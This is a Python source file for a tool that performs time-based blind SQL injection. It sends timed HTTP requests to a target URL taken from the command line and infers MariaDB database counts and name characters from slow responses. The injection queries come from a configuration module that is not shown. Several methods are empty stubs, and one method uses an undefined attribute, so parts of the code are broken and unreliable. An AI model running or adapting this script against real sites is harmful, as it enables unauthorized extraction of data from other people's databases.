#!/bin/python3
import argparse
import urllib.request
import urllib.parse
import gzip
import configuration as config
import time

###### HTTP request ######

class HTTPrequest():
    """ Sends HTTP request and retrieves response. """

    def __init__(self, url, header, data=None):
        self.url = url
        self.header = self._format_header(header)
        self.data = data
        self.request = None
        self.response = None
        self.payload = None
        self.payload_parts = None

    def send_request(self, payload):
        """ Send HTTP request and decompress response if gzip compressed. """
        self.payload = self._encode_url(payload)
        self._create_request()
        with urllib.request.urlopen(self.request) as response:
            self.response = response.read()
            # Check if gzip compressed.
            if self.response[0:2] == b'\x1f\x8b':
                self.response = gzip.decompress(self.response)

            return self.response

    def get_response(self):
        """ Return HTTP response. """
        return self.response

    def _create_request(self):
        """ Create a request object  """
        self.request = urllib.request.Request(self.payload, self.data, self.header)

    def _format_header(self, header):
        """ Format list of headers input from cli and return a dict.  """
        self.header_list = header.split(", ")
        self.header_dict = dict()
        for i in range(len(self.header_list)):
            self.header_list[i] = self.header_list[i].strip()
            self.header_seperate = self.header_list[i].split(": ")
            self.header_dict[self.header_seperate[0]] = self.header_seperate[1]

        return self.header_dict

    def _encode_url(self, payload):
        """ Encode url """
        self.payload_parts = self._parse_url(payload)
        self.payload_parts = self._url_encode_path()
        self.payload_parts = self._url_encode_params()
        self.payload_parts = self._url_encode_query()
        return self.payload_parts.geturl()

    def _parse_url(self, payload):
        """ Returns a named tuple of url split into parts.  """
        return urllib.parse.urlparse(payload)

    def _url_encode_path(self):
        """ Encode the path of a url.  """
        self.path = self.payload_parts.path
        return self.payload_parts._replace(path=urllib.parse.quote(self.path))

    def _url_encode_params(self):
        """ Encode the parameters of a url.  """
        self.params = self.payload_parts.params
        return self.payload_parts._replace(params=urllib.parse.quote(self.params))

    def _url_encode_query(self):
        """ Encode the query/queries of a url.  """
        self.query = self.payload_parts.query
        return self.payload_parts._replace(query=urllib.parse.quote(self.query, safe='&='))

###### Injection base class ######

class BaseInjection(HTTPrequest):

    def __init__(self, url, header, data=None):
        super().__init__(url, header, data)
        self.CHAR_SET = config.Characters.ALL_CHARS.value
        self.payload = None
        self.database_name_chars = []

    def get_version(self):
        pass

    def get_column_num(self):
        pass

    def get_database_num(self, query):
        for i in range(0, 50):
            self.payload = self.url + query
            self.time_start = time.time()
            self.res = self.send_request(self.payload.format(i))
            self.time_finish = time.time()
            self.total_time = self.time_finish - self.time_start
            if(self.total_time > 1):
                print('Number of databases found = ',i , ', with a response time of ', self.total_time)

    def get_databases(self, query):
        self._find_chars_used(query)

    def get_table_names(self):
        pass

    def get_table_columns(self):
        pass

    def _find_chars_used(self, query):
        """ Iterate over legal characters to find a subset that is used. """
        for char in self.CHAR_SET:
            self.payload = self.url + query
            self.time_start = time.time()
            self.res = self.send_request(self.payload.format(hex(ord(char))))
            self.time_finish = time.time()
            self.total_time = self.time_finish - self.time_start
            if(self.total_time > 5):
                print('Character found: ', char, ' ... in response time of', self.total_time)
                self.database_name_chars.append(char)

    def _find_database_names(self, query):
        """ Iterate over known characters to find database names. """
        self.char_found = True
        index = 0
        self.multiple_convert = ''
        self.test_convert = ''
        char_found_index = 0
        while(self.char_found):
            for char in self.database_name_chars:
                self.payload = self.url + query
                self.single_convert = 'CONVERT({} USING utf8), '.format(hex(ord(char)))
                self.test_convert = self.test_convert + self.single_convert
                self.time_start = time.time()
                self.res = self.send_request(self.payload.format(self.test_convert))
                self.time_finish = time.time()
                self.total_time = self.time_finish - self.time_start
                if(self.total_time > 5):
                    self.multiple_convert = self.multiple_convert + self.test_convert
                    print(char)
                else:
                    self.test_convert = self.multiple_convert
                    char_found_index = char_found_index + 1
            if(char_found_index == len(self.name_chars)):
                self.char_found = False
###### MySQL ######

class MySQLunion(BaseInjection):

    def __init__(self):
        pass

###### mariaDB ######

class MariaDB(BaseInjection):

    def __init__(self, url, header, data=None):
        super().__init__(url, header, data)

    def get_database_num(self):
        super().get_database_num(config.MariaDB.DATABASE_NUM.value)

    def get_databases(self):
        super().get_databases(config.MariaDB.DATABASE_NAME_CHAR.value)

###### Command line parser ######
parser = argparse.ArgumentParser()

parser.add_argument("url", help="url of target in format http://x.x.x.x:port/path")
parser.add_argument("-H", "--header", help="Header values in comma seperated list. See README for formatting. ex. Host: x.x.x.x, Accept: text/html")


###### Main function ######
def main():
    args = parser.parse_args()
    test_obj = MariaDB(url=args.url, header=args.header)
    test_obj.get_database_num()
    test_obj.get_databases()

if __name__ == "__main__":
    main()
